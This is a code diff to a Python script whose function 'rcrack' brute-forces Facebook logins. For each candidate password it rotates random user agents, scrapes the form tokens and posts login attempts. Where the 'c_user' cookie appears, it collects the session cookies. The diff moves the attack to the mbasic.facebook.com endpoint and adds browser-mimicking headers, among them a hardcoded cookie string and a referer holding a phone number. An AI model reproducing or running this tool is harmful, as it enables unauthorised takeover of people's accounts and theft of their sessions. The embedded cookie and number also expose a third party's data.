@@ -203,7 +203,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -214,24 +214,29 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'x.facebook.com',
+            header_freefb = {"authority": 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-    'accept-language': 'en-US,en;q=0.7',
+   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
+    'content-type': 'application/x-www-form-urlencoded',
+    'cookie': 'sb=ZcZ5ZM25UbFT8J3DpVTiKG78; datr=ZcZ5ZF2CYb7wGpBARt6O_30B; fr=0WEXAdVmmW9uDk3jG.AWWIjFsqodYem8gM-4Q2-i3tBmk.BkecZl.g7.AAA.0.0.Bkgu7F.AWVHR_bqhEU',
+    'origin': 'https://mbasic.facebook.com',
+    'referer': 'https://mbasic.facebook.com/login/?email=01716212322&li=_dKNZLa3Iq_b5pAfvB0oGQEW&e=1348131&shbl=1&refsrc=deprecated&_rdr',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+    'sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-ch-ua-platform-version': '"10.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
+    'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
-    'sec-gpc': '1',
     'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.post('https://www.facebook.com/',data=log_data,headers=header_freefb).text
+            lo = session.post('https://mbasic.facebook.com/login/',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
